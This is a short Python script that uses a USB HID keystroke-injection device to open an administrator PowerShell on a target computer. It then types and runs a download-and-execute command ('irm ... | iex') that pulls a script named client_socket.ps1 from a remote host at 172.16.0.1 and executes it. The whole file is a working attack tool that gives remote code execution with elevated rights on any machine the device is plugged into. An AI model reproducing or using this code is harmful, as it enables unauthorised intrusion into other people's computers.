from hid_keystroke_injector import open_admin_powershell, send_string, send_special_key
import time

def trigger_client_socket(hid_path='/dev/hidg0'):
    open_admin_powershell(hid_path=hid_path)
    
    time.sleep(1.0)
    
    socket_cmd = "irm http://172.16.0.1:8000/client_socket.ps1 | iex"
    
    send_string(socket_cmd, delay=0.01, hid_path=hid_path)
    
    time.sleep(0.5)
    
    send_special_key('enter', hid_path=hid_path)
